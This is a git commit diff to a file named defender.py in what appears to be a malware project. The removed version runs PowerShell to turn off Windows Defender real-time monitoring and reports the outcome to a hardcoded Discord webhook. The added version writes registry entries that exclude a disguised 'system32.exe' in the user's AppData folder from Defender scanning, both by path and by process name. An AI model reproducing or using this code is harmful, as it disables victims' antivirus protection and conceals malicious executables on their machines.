28a95e4a0994cfebe346d0d6e2bddb6f86e39443
Gravity <137218519+gravitacia@users.noreply.github.com>
2025-10-08 23:19:06 +0400

    Update defender.py

--- components/defender.py
+++ components/defender.py
@@ -1,27 +1,8 @@
-import subprocess
-import requests
+import subprocess, requests
+commands = [
+    'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" -Name "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\system32.exe" -Value 0 -PropertyType DWORD',
+    'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes" -Name "system32.exe" -Value 0 -PropertyType DWORD',
+]
 
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1424020599566766110/_Q_3efoJ6bIZxmjTQ342HeR7-DfFCLZxwWa7O4SZOq5W4wyT5E17i4H6KjA0KxyOhS_J"
-
-
-command = "Set-MpPreference -DisableRealtimeMonitoring $true"
-
-
-result = subprocess.run(
-    ["powershell", "-Command", command],
-    capture_output=True,
-    text=True,
-    shell=True
-)
-
-
-if result.returncode == 0:
-    message = f"Command '{command}' executed:\n{result.stdout}"
-else:
-    message = f"Command '{command}' failed:\n{result.stderr}"
-
-
-requests.post(WEBHOOK_URL, json={"content": message})
-
-print("Done!")
+for command in commands:
+    result = subprocess.run(["powershell", "-Command", command])
